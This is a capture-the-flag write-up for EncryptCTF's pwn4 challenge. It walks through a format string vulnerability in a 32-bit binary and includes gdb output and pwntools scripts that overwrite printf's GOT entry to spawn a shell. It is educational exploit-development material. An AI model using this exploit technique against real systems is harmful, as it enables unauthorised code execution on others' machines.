## EncryptCTF: pwn4
##### *tl;dr: format string vulnerability*
#### I didn't solve this during the ctf since I had no knowledge regarding format string vulnerabilities and how to exploit them at that time. But with a little bit of reading, watching, and practice, I managed to solve it at last. For a better understanding of how the exploit works, watch LiveOverflow's [video](https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=21&t=221s). Checking the security of the binary, we get this:
```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
#### Stack protection measures are on, guaranteeing that we won't be doing some stack-smashing on this challenge. And interesting to see the `No RELRO` protection, which means that we can overwrite stuff on the `Global Offset Table`. We do a quick format string test running the binary.
```
$ ./pwn4
Do you swear to use this shell with responsility by the old gods and the new?

AAAA %p %p %p %p %p %p %p %p %p %p %p %p
AAAA (nil) 0x2 (nil) 0xf7ffda9c 0x1 0xf7fcf410 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
i don't belive you!
AAAA %p %p %p %p %p %p %p %p %p %p %p %p
```
#### And we can confirm that we have a format string vuln since we printed out values from the stack. We can also locate our buffer which is at the 7th offset. We can put our address at that offset and we can overwrite it to change control flow. But where do we want to redirect it to? Using gdb, we find a peculiarly labeled function `__` at address `0x0804853d`. Disassembling it we see the following code which grants us an interactive shell. 
```
gdb-peda$ disas __
Dump of assembler code for function __:
   0x0804853d <+0>:	push   ebp
   0x0804853e <+1>:	mov    ebp,esp
   0x08048540 <+3>:	sub    esp,0x18
   0x08048543 <+6>:	mov    DWORD PTR [esp],0x8048680
   0x0804854a <+13>:	call   0x8048400 <system@plt>
   0x0804854f <+18>:	leave  
   0x08048550 <+19>:	ret    
End of assembler dump.
```
#### Now that we have what we want to write, we figure out where do we want to write it to - the GOT entry of printf. If we successfully pull this off, when printf function is used, the flag function is called instead. We can easily get the addresses we need with gdb.
```
gdb-peda$ p printf
$1 = {<text variable, no debug info>} 0x80483c0 <printf@plt>

gdb-peda$ disas printf
Dump of assembler code for function printf@plt:
   0x080483c0 <+0>:	jmp    DWORD PTR ds:0x80498fc
   0x080483c6 <+6>:	push   0x0
   0x080483cb <+11>:	jmp    0x80483b0
End of assembler dump.
```
## Exploitation
#### Before we proceed to the exciting part, we first do a test onto writing to the printf entry using a simple python script, save the output to a file for debugging purposes. 
```python
from pwn import *

#: Exploit code
offset = 7
printf_got = 0x80498fc
flag_addr = 0x804853d
exploit = p32(printf_got) + '%7$n'
print(exploit)
```
#### To see if our exploit will indeed overwrite the current printf GOT into 4 (since 32-bit addresses are 4 bytes, and we'll be writing these four bytes onto the seventh offset with `%7$n`), we set a breakpoint before the last printf call and examine the GOT address.
```
$ python exploit.py > exploit

[...]

gdb-peda$ break *0x080485c4
Breakpoint 1 at 0x80485c4

gdb-peda$ r < exploit
[...]
Breakpoint 1, 0x080485c4 in main ()
gdb-peda$ x/wx 0x080498fc
0x80498fc <printf@got.plt>:	0x00000004
```
#### And yup! We have successfully overwritten the GOT entry for printf. Now we want to overwrite it with the flag functions address. We'll make some quick changes to our script to print out a number of spaces equal to that of the flag function's address then write it into the offset:
```python
from pwn import *

#: Exploit code
offset = 7
printf_got = 0x80498fc
flag_addr = 0x804853d
exploit = p32(printf_got) + '%{}i%7$n'.format(flag_addr)
print(exploit)
```
#### Test it again with gdb, but it'll take a while to debug since it'll print out a lot of spaces so we'll have to wait:
```
gdb-peda$ r < exploit
[...]
Breakpoint 1, 0x080485c4 in main ()

gdb-peda$ x/wx 0x080498fc
0x80498fc <printf@got.plt>:	0x08048541
```
#### Something seems weird, our exploit should've worked, but it seems that we went a little bit too far of the value we want to be written. Doing a quick calculation, `0x08048541 - 0x0804853d = 4`, we only need to subtract 4 from the flag address in our exploit script to get what we want to. For our final exploit to get an interactive shell:
##### exploit.py
```python
from pwn import *

#: Connect to challenge server
p = process('./pwn4')
print(p.recv())

#: Exploit code
flag_addr  = 0x0804853d
printf_GOT = 0x080498fc
offset = 7
exploit = p32(printf_GOT) + '%{}i%7$n'.format(flag_addr-4)

#: Send payload
p.sendline(exploit)
print(p.recv())
p.interactive()
```
#### Running it will take some time, but it's worth the wait, we get our shell and our flag!
```
$ python exploit.py
[...]
[*] Switching to interactive
$ cat flag.txt
encryptCTF{Y0u_4R3_7h3_7ru3_King_0f_53v3n_KingD0ms}
```
